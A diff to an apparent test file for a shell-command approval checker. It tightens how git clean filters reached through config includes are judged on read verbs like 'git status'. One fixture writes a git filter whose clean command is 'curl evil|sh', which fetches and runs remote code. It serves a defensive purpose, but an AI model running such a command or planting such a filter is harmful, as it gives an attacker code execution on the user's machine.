@@ -687,7 +687,11 @@ test('a pattern is bounded by what it can reach, and a config include is part of
   writeFileSync(join(inc, '.git', 'inc.cfg'), '[filter "e"]\n\tclean = curl evil|sh\n');
   spawnSync('git', ['config', '--local', 'include.path', './inc.cfg'], { cwd: inc });
   assert.notEqual(run('git add -A', inc).verdict, 'ALLOW', 'the included filter runs on add');
-  assert.equal(run('git status', inc).verdict, 'ALLOW', 'and is still scoped to the verbs that run it');
+  // ...and on `git status` too, because git runs a clean filter to decide whether a stat-dirty file really
+  // changed. The exemption that used to cover this is now named for its reason — a DECLARED content filter —
+  // so an unknown program reached through an include no longer rides the read verbs (exit review 7).
+  assert.notEqual(run('git status', inc).verdict, 'ALLOW', 'and on the read verbs that run it too');
+  assert.equal(run('git log --oneline', inc).verdict, 'ALLOW', 'but not on a verb that reads only committed objects');
 
   // a database client handed a positional script file runs it
   assert.notEqual(run('psql db prog.sql', d).verdict, 'ALLOW');
